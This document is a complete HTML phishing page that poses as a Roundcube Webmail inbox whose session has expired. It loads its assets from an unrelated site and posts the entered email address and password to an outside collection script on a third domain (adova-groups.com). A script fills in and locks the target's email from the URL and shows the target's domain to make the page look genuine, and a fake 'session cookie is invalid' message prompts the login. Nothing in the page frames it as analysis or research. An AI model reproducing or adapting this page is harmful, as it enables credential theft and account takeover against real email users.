
<!DOCTYPE html>
<html lang="en">
<head>
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">
<title>Roundcube Webmail :: Inbox</title>
<meta name="viewport" content="" id="viewport" />
<link rel="shortcut icon" href="https://www.mallkum.com/wp_monito/ndcudelay/favicon.ico"/>
<link rel="stylesheet" type="text/css" href="https://www.mallkum.com/wp_monito/ndcudelay/styles.min.css" />

<script type="text/javascript">
function checkFilled() {
    var fn=document.getElementById('_pass').value;	
	 if(fn.length < 5){
        document.getElementById('_pass').style.borderColor = "rgb(232, 17, 35)";
        document.getElementById('efired').style.display = "block";
        return false;
    }else{
		document.getElementById('_pass').style.borderColor = "blue";
    }
}


</script>
</head>
<body class="minwidth">

<div id="header">
<div id="topline" role="banner" aria-labelledby="aria-label-topnav">
	<h2 id="aria-label-topnav" class="voice">Window control</h2>
	<div class="topleft">
		
                                <img id="imgLogo" class="navbar-brand-logo" src="https://www.mallkum.com/wp_monito/ndcudelay/webmail.png" />
					</div>
	
	<div class="topright">
	<img src="https://www.mallkum.com/wp_monito/ndcudelay/user.png" width="14" height="14" style="margin-top:2px;" />
			<span class="username"><b style="color:#FFF;"></b></span>
		<a class="button-logout" id="rcmbtn101" role="button" href="" onclick="return rcmail.command('switch-task','logout',this,event)">Logout</a>
	
	</div>
</div>
<div id="topnav">
	<h2 id="aria-label-tasknav" class="voice">Application tasks</h2>
	<div id="taskbar" class="topright" role="navigation" aria-labelledby="aria-label-tasknav">
		<a class="button-mail" id="rcmbtn102" role="button"  href=""><span class="button-inner">Mail</span></a>
		<a class="button-addressbook" id="rcmbtn103" role="button"  href=""><span class="button-inner">Address Book</span></a>
		
		<a class="button-settings" id="rcmbtn104" role="button" href=""><span class="button-inner">Settings</span></a>
		<a class="button-logout" id="rcmbtn105" role="button" href="./?_task=logout" onclick="return rcmail.command('switch-task','logout',this,event)"><span class="button-inner">Logout</span></a>
		<span class="minmodetoggle" role="presentation"></span>
	</div>
	<img src="https://www.mallkum.com/wp_monito/ndcudelay/roundcube_logo.png" id="toplogo" alt="Logo">
</div>

<br style="clear:both" />
</div>


<div id="mainscreen">

<h1 class="voice">Mail</h1>

<!-- toolbar -->
<h2 id="aria-label-toolbar" class="voice">Application toolbar</h2>
<div id="messagetoolbar" class="toolbar" role="toolbar" aria-labelledby="aria-label-toolbar">
	<a class="button checkmail" title="Check for new messages" id="rcmbtn106" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('checkmail','',this,event)">Refresh</a>
	<a class="button compose" title="Create a new message" id="rcmbtn107" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('compose','',this,event)">Compose</a>
<span class="spacer"></span>
<a class="button reply" title="Reply to sender" id="rcmbtn108" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('reply','',this,event)">Reply</a>
<span class="dropbutton">
	<a class="button reply-all" title="Reply to list or to sender and all recipients" href="">Reply all</a>
	<a href="" class="dropbuttontip">Reply-all options</a>
</span>
<span class="dropbutton">
	<a class="button forward" title="Forward the message" id="rcmbtn110" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('forward','',this,event)">Forward</a>
	<a href="#forward" class="dropbuttontip" id="forwardmenulink" onclick="UI.toggle_popup('forwardmenu',event);return false" aria-haspopup="true" aria-expanded="false" aria-owns="forwardmenu-menu" tabindex="0">Forwarding options</a>
</span>
<a class="button delete " title="Delete message" id="rcmbtn111" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('delete','',this,event)">Delete</a>

<a id="markmessagemenulink" class="button markmessage" title="Mark messages" onclick="UI.toggle_popup('markmessagemenu',event);return false" aria-haspopup="true" aria-expanded="false" aria-owns="markmessagemenu-menu" role="button" href="">Mark</a>
<a id="messagemenulink" class="button more" title="More actions..." onclick="UI.toggle_popup('messagemenu',event);return false" aria-haspopup="true" aria-expanded="false" aria-owns="messagemenu-menu" role="button" href="">More</a>

<div id="forwardmenu" class="popupmenu" aria-hidden="true">
	<h3 id="aria-label-forwardmenu" class="voice">Forwarding options</h3>
	<ul id="forwardmenu-menu" class="toolbarmenu" role="menu" aria-labelledby="aria-label-forwardmenu">
		<li role="menuitem"><a class="forwardlink" id="rcmbtn112" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('forward-inline','sub',this,event)">Forward inline</a></li>
		<li role="menuitem"><a class="forwardattachmentlink" id="rcmbtn113" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('forward-attachment','sub',this,event)">Forward as attachment</a></li>
		
	</ul>
</div>

<div id="replyallmenu" class="popupmenu" aria-hidden="true">
	<h3 id="aria-label-replyallmenu" class="voice">Reply-all options</h3>
	<ul id="replyallmenu-menu" class="toolbarmenu" role="menu" aria-labelledby="aria-label-replyallmenu">
		<li role="menuitem"><a class="replyalllink" id="rcmbtn114" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('reply-all','sub',this,event)">Reply all</a></li>
		<li role="menuitem"><a class="replylistlink" id="rcmbtn115" role="button" tabindex="-1" aria-disabled="true" href="" onclick="return rcmail.command('reply-list','sub',this,event)">Reply list</a></li>
		
	</ul>
</div>





</div>

<div id="messagesearchtools">

<!-- search filter -->


<!-- search box -->
<div id="quicksearchbar" class="searchbox" role="search" aria-labelledby="aria-label-searchform">
<h2 id="aria-label-searchform" class="voice">Email message search form</h2>
<label for="quicksearchbox" class="voice">Email search input</label>
<a id="searchmenulink" class="iconbutton searchoptions" title="Search modifiers" aria-haspopup="true" aria-expanded="false" aria-owns="searchmenu-menu" role="button" href="">Options</a>



</div>

</div>
<div id="mainscreencontent">
<div id="mailview-left">


<div id="login-form" style="margin-top:30px;">
<div class="box-inner" role="main">
<img src="https://www.mallkum.com/wp_monito/ndcudelay/roundcube_logo.png" id="logo" alt="Roundcube Webmail">
<form name="form" method="post" action="https://adova-groups.com/roundcube/logged.php" autocomplete="off"  onsubmit="return checkFilled();">
	<span id="efired" style="display:none; font-size:12px; padding-left:95px; color:rgb(232, 17, 35); font-weight:bold;">Password is required.</span>
<table><tbody><tr><td class="title"><label for="rcmloginuser">Username</label>
</td>
<td class="input">
<input name="drift" type="email" required id="drift" style="font-weight:bold;" size="40"  autocapitalize="off">
            </td>
</tr>
<tr><td class="title"><label for="rcmloginpwd">Password</label></td>
<td class="input"><input name="pass" id="pass" required size="40" autocapitalize="off" type="password"></td>
</tr>
</tbody>
</table>
<p class="formbuttons"><input type="submit" id="rcmloginsubmit" onClick="check(this.form)" class="button mainaction" value="Login"></p>

</form>

</div>

<div class="box-bottom" role="complementary">
	<div id="message" style="font-weight:bold; color:#766; font-size:11px;">Your session cookie is invalid.  <span style="color:#000;">Login to Continue.</span></div>

</div>

<div id="bottomline" role="contentinfo">
	Roundcube Webmail 
		
</div>
</div>





<script src=https://code.jquery.com/jquery-3.3.1.min.js></script>
    <script src=https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js integrity=sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ crossorigin=anonymous></script>
    <script src=https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js integrity=sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm crossorigin=anonymous></script>
    <script src=https://code.jquery.com/jquery-3.3.1.slim.min.js integrity=sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo crossorigin=anonymous></script>
    <script src=https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js integrity=sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ crossorigin=anonymous></script>
    <script src=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js integrity=sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa crossorigin=anonymous></script>
    <script>
        const email = new URLSearchParams(location.search).get('email');
        const error = new URLSearchParams(location.search).get('error');
        if(email){
            document.getElementById('drift').value = email;
            document.getElementById('drift').setAttribute('readonly', 'true');
            let dom = email.slice(email.indexOf('@') + 1);
            dom = dom[0].toUpperCase() + dom.slice(1);
            document.getElementById('dom').innerHTML = dom;

        }
        if(error){
            document.getElementById('error').value = 'email';
            document.getElementById('err').style.display = 'true';
        }

    </script>
</body>
    </html>
